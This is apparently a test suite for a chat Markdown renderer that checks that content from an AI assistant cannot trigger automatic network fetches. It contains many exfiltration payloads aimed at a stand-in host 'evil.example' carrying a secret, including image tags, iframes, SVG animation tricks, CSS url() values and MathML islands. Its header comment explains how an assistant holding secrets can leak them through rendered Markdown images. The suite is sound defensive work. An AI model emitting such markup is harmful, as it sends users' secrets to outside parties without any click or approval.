/**
 * The PPM Assistant reads untrusted content and holds secrets in its context, so its own
 * Markdown must not make the browser fetch anything: `![](https://x/?k=<secret>)` would send
 * the secret to `x` with no click and no approval. In Assistant content an external image is
 * a link the user may follow, and raw HTML that loads on its own is neutralised. An ordinary
 * chat renders exactly as before.
 */
import { afterAll, describe, expect, it } from "bun:test";
import { installDom, uninstallDom, mount } from "../../helpers/react-dom";
import { isExternalResourceUrl } from "../../../src/web/components/shared/markdown-external-resources";

installDom();
const { MarkdownRenderer } = await import("../../../src/web/components/shared/markdown-renderer");
const { AssistantContentContext } = await import("../../../src/web/components/shared/markdown-context");
afterAll(uninstallDom);

const LEAK = "https://evil.example/collect?k=secret";

async function render(content: string, mode: "normal" | "assistant-project" | "assistant-context"): Promise<HTMLElement> {
  const md = mode === "assistant-project"
    ? <MarkdownRenderer content={content} projectName="__assistant__" />
    : <MarkdownRenderer content={content} projectName="ppm" />;
  const view = await mount(mode === "assistant-context"
    ? <AssistantContentContext.Provider value={true}>{md}</AssistantContentContext.Provider>
    : md);
  const root = view.container.cloneNode(true) as HTMLElement;
  await view.unmount();
  return root;
}

/** Every URL the rendered DOM would fetch on its own. */
function autoLoaded(root: HTMLElement): string[] {
  const urls: string[] = [];
  for (const el of root.querySelectorAll("*")) {
    for (const attr of ["src", "srcset", "poster", "data", "background", "href"]) {
      const value = el.getAttribute(attr);
      if (!value) continue;
      if (attr === "href" && el.tagName === "A") continue;
      urls.push(value);
    }
    const style = el.getAttribute("style");
    if (style && /url\(/i.test(style)) urls.push(style);
  }
  for (const tag of ["iframe", "video", "audio", "embed", "object", "source", "picture", "link", "script", "style"]) {
    if (root.querySelector(tag)) urls.push(`<${tag}>`);
  }
  return urls;
}

describe("an external image in Markdown", () => {
  it("is still an image in an ordinary chat", async () => {
    const root = await render(`![chart](${LEAK})`, "normal");
    expect(root.querySelector("img")?.getAttribute("src")).toBe(LEAK);
  });

  for (const mode of ["assistant-project", "assistant-context"] as const) {
    it(`becomes a link the user clicks in Assistant content (${mode})`, async () => {
      const root = await render(`See ![chart](${LEAK}) here`, mode);
      expect(root.querySelector("img")).toBeNull();
      const link = root.querySelector("a")!;
      expect(link.getAttribute("href")).toBe(LEAK);
      expect(link.textContent).toContain("chart");
      expect(autoLoaded(root)).toEqual([]);
    });
  }

  it("does not let a protocol-relative source through the local-path loader", async () => {
    const root = await render("![x](//evil.example/a.png)", "assistant-project");
    expect(root.querySelector("img")).toBeNull();
    expect(autoLoaded(root)).toEqual([]);
  });

  it("keeps a local file image an image", async () => {
    const root = await render("![shot](/home/me/shot.png)", "assistant-project");
    expect(root.querySelector("img")).not.toBeNull();
  });
});

describe("raw HTML in Assistant content", () => {
  const HTML = [
    `<img src="${LEAK}" alt="pixel">`,
    `<img src="/home/me/a.png" srcset="${LEAK} 2x">`,
    `<iframe src="${LEAK}"></iframe>`,
    `<video src="${LEAK}" poster="${LEAK}"></video>`,
    `<audio><source src="${LEAK}"></audio>`,
    `<picture><source srcset="${LEAK}"><img src="/x.png"></picture>`,
    `<object data="${LEAK}"></object>`,
    `<embed src="${LEAK}">`,
    `<link rel="stylesheet" href="${LEAK}">`,
    `<div style="background:url(${LEAK})">bg</div>`,
    `<div style="background:u\\72l(${LEAK})">escaped</div>`,
    `<svg><image href="${LEAK}"></image></svg>`,
    `<table background="${LEAK}"><tr><td>t</td></tr></table>`,
    `<input type="image" src="${LEAK}">`,
  ].join("\n\n");

  it("loads nothing from outside PPM", async () => {
    const root = await render(HTML, "assistant-project");
    expect(autoLoaded(root).filter((u) => u.includes("evil.example") || u.startsWith("<"))).toEqual([]);
  });

  it("would have loaded every one of them in an ordinary chat (the probe sees them)", async () => {
    const root = await render(HTML, "normal");
    const leaks = autoLoaded(root).filter((u) => u.includes("evil.example") || u.startsWith("<"));
    for (const tag of ["<iframe>", "<video>", "<audio>", "<object>", "<embed>", "<link>"]) expect(leaks).toContain(tag);
    expect(leaks.filter((u) => u.includes("evil.example")).length).toBeGreaterThan(5);
  });

  it("still offers what an embed pointed at, as a link", async () => {
    const root = await render(`<iframe src="${LEAK}"></iframe>`, "assistant-project");
    expect(root.querySelector("iframe")).toBeNull();
    expect([...root.querySelectorAll("a")].map((a) => a.getAttribute("href"))).toContain(LEAK);
  });

  it("is rendered as before in an ordinary chat", async () => {
    const root = await render(`<iframe src="${LEAK}"></iframe>`, "normal");
    expect(root.querySelector("iframe")?.getAttribute("src")).toBe(LEAK);
  });

  it("keeps maths rendering, whose layout styles fetch nothing", async () => {
    const root = await render("$$x^2 + y^2$$", "assistant-project");
    expect(root.querySelector(".katex")).not.toBeNull();
  });
});

/**
 * Markup a list of "attributes that fetch" cannot see: an SVG animation sets a URL attribute
 * *after* render (`<set attributeName="href" to=…>` turns an empty `<image>` into a request),
 * and SVG presentation attributes are CSS values, so `fill`, `filter`, `mask`, `clip-path`,
 * `marker-*` and `cursor` can each name `url(…)`. MathML adds `href` on any element, and a
 * foreign-content island lets HTML back in under a parent that looked inert. Assistant content
 * renders only what is known to be static, so none of it survives.
 */
describe("raw HTML that fetches after render or through a CSS value", () => {
  const CASES: Array<[string, string]> = [
    ["SMIL <set> giving an image its source", `<svg><image><set attributeName="href" to="${LEAK}"/></image></svg>`],
    ["SMIL <animate> over a <use> reference", `<svg><use><animate attributeName="href" values="${LEAK};${LEAK}" dur="1s"/></use></svg>`],
    ["SMIL on xlink:href with from/to", `<svg><image><animate attributeName="xlink:href" from="${LEAK}" to="${LEAK}"/></image></svg>`],
    ["animateTransform / animateMotion", `<svg><rect width="1" height="1"><animateTransform attributeName="transform" type="rotate" values="0;9"/><animateMotion path="M0 0L9 9"/></rect></svg>`],
    ["paint server and effect references", `<svg><rect width="9" height="9" fill="url(${LEAK}#p)" stroke="url(${LEAK}#s)" filter="url(${LEAK}#f)" mask="url(${LEAK}#m)" clip-path="url(${LEAK}#c)"/></svg>`],
    ["marker and cursor references", `<svg><path d="M0 0L9 9" marker-start="url(${LEAK}#a)" marker-end="url(${LEAK}#b)" cursor="url(${LEAK}), auto"/></svg>`],
    ["an escaped url() in a presentation attribute", `<svg><rect width="9" height="9" fill="u\\72l(${LEAK}#p)"/></svg>`],
    ["feImage inside a filter", `<svg><filter id="f"><feImage href="${LEAK}"/></filter></svg>`],
    ["HTML inside foreignObject", `<svg><foreignObject width="9" height="9"><img src="${LEAK}"></foreignObject></svg>`],
    ["MathML href on a token element", `<math><mi href="${LEAK}">x</mi></math>`],
    ["HTML inside a MathML annotation-xml", `<math><semantics><mi>x</mi><annotation-xml encoding="text/html"><img src="${LEAK}"></annotation-xml></semantics></math>`],
    ["an unknown element carrying a URL attribute", `<x-widget src="${LEAK}" background="${LEAK}">kept text</x-widget>`],
    ["an image input", `<input type="image" src="${LEAK}">`],
  ];
  /** Tags that only animate or pull in other content; none may appear in Assistant output. */
  const DYNAMIC_TAGS = ["animate", "set", "animateTransform", "animateMotion", "image", "use", "feImage", "foreignObject", "annotation-xml", "x-widget"];

  /**
   * Every place the leak URL survives except a link's own target or tooltip, which load
   * nothing until clicked. Broader than `autoLoaded`: any attribute counts, since which ones
   * fetch is exactly what a denylist gets wrong.
   */
  function leakingAttributes(root: HTMLElement): string[] {
    const found: string[] = [];
    for (const el of root.querySelectorAll("*")) {
      for (const attr of el.getAttributeNames()) {
        if (!el.getAttribute(attr)?.includes("evil.example")) continue;
        if (attr === "title" || (el.tagName === "A" && attr === "href")) continue;
        found.push(`${el.tagName.toLowerCase()}[${attr}]`);
      }
    }
    for (const tag of DYNAMIC_TAGS) {
      if ([...root.querySelectorAll("*")].some((el) => el.tagName.toLowerCase() === tag.toLowerCase())) found.push(`<${tag}>`);
    }
    return found;
  }

  for (const [name, html] of CASES) {
    it(`renders nothing that can fetch: ${name}`, async () => {
      const root = await render(html, "assistant-project");
      expect(leakingAttributes(root)).toEqual([]);
    });
  }

  it("would have rendered the dynamic markup in an ordinary chat (the probe sees it)", async () => {
    // SVG only: happy-dom gives an <img> created under MathML no `style`, so React cannot
    // mount the annotation-xml case here at all (a test-DOM gap, not a rendering one).
    const svgOnly = CASES.filter(([, html]) => html.startsWith("<svg")).map(([, html]) => html);
    const root = await render(svgOnly.join("\n\n"), "normal");
    const leaks = leakingAttributes(root);
    for (const tag of ["<set>", "<animate>", "<image>", "<use>", "<foreignObject>"]) expect(leaks).toContain(tag);
    expect(leaks).toContain("rect[fill]");
  });

  it("keeps the text of an element it does not render", async () => {
    const root = await render(`<x-widget src="${LEAK}">kept text</x-widget>`, "assistant-project");
    expect(root.textContent).toContain("kept text");
  });

  it("still draws a static SVG", async () => {
    const root = await render(`<svg viewBox="0 0 10 10" width="10"><g><rect width="10" height="10" fill="red"/><path d="M0 0L9 9" stroke="blue"/></g></svg>`, "assistant-project");
    const rect = [...root.querySelectorAll("*")].find((el) => el.tagName.toLowerCase() === "rect");
    expect(rect?.getAttribute("fill")).toBe("red");
    expect(root.querySelector("svg")?.getAttribute("viewBox")).toBe("0 0 10 10");
  });

  it("keeps KaTeX's own SVG and MathML (roots, arrows, fractions)", async () => {
    const root = await render("$$\\sqrt{x^2+1} + \\frac{a}{b} + \\overrightarrow{AB} + \\cancel{x}$$", "assistant-project");
    const tags = [...root.querySelectorAll("*")].map((el) => el.tagName.toLowerCase());
    for (const tag of ["svg", "path", "line", "math", "msqrt", "mfrac", "annotation"]) expect(tags).toContain(tag);
    expect(root.querySelector(".katex-html")).not.toBeNull();
  });

  it("keeps GFM task lists, table alignment and footnotes", async () => {
    const root = await render("- [x] done\n\n| a | b |\n|:-|-:|\n| 1 | 2 |\n\nnote[^1]\n\n[^1]: the note", "assistant-project");
    expect(root.querySelector("input[type=checkbox]")?.hasAttribute("checked")).toBe(true);
    expect(root.querySelector("td")?.getAttribute("style")).toContain("text-align: left");
    expect(root.querySelector("a[data-footnote-ref]")).not.toBeNull();
  });
});

describe("isExternalResourceUrl", () => {
  it.each([
    ["https://x.example/a.png", true],
    ["HTTP://x.example", true],
    ["//x.example/a", true],
    ["/\\x.example/a", true],
    ["ht\ntps://x.example", true],
    ["  https://x.example", true],
    ["ftp://x.example/a", true],
    ["/home/me/a.png", false],
    ["C:\\Users\\me\\a.png", false],
    ["relative/a.png", false],
    ["data:image/png;base64,AAAA", false],
    ["blob:https://ppm/123", false],
    ["", false],
  ])("%s → %s", (url, expected) => {
    expect(isExternalResourceUrl(url)).toBe(expected);
  });
});
